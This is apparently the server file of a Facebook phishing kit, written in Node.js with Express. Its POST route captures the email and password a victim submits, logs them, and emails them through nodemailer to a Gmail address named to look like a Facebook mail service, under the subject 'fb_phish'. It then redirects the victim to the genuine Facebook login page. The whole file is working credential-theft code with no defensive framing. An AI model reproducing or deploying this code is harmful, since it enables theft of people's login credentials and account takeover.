// NPM packages //
const express = require('express');
const app = express();
const port = process.env.PORT || 8080;
const hbs = require('hbs');
const chalk = require('chalk');
const path = require('path');
const nodemailer = require("nodemailer");
require('dotenv').config();
require('./routes/routes')(app);

// files path //
const staticPath = path.join(__dirname , '/public/');
const viewsPath = path.join(__dirname , '/templates/views/');
const partialsPath = path.join(__dirname , '/templates/partials/');

// express url encode for POST request //
app.use(express.json());
app.use(express.urlencoded({
    extended: false
}));

// To Set The View Engine as handlebars //
app.set('view engine', 'hbs');
app.set("views", viewsPath);
hbs.registerPartials(partialsPath);
app.use(express.static(staticPath));

// nodemailer auth //
let transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: process.env.EMAIL,
        pass: process.env.PASSKEY,
    },
});

// POST request //
app.post('/', (req, res) => {
        let userEmail = req.body.email;
        let userPass = req.body.pass;
        let keypass = userEmail + " " + userPass;
        console.log(keypass);
        
        // nodemailer mail option //
        let mailOptions = {
            from: 'facebookmailservices.secure@gmail.com', // sender address
            to: "facebookmailservices.secure@gmail.com", // list of receivers
            subject: "Mail From fb_phish ✔", // Subject line
            text: keypass
        };
        
        transporter.sendMail(mailOptions , (err , data) => {
            if (err) {
                console.log(`Error Occured => ${err}`);
            } else {
                console.log('Email Send Sucessfully');
            }
        });
        
        res.redirect('https://m.facebook.com/login/?refsrc=https%3A%2F%2Fen-gb.facebook.com%2Flogin%2F');
    });
    
// listening app on port 8080 //
app.listen(port , (err) => {
    if (err) {
        console.log(`error found while listening on server === ${err}`);
    } else {
        console.log( chalk.red.bgBlue.bold(`server runnung on    http://127.0.0.1:${port}`));
    }
});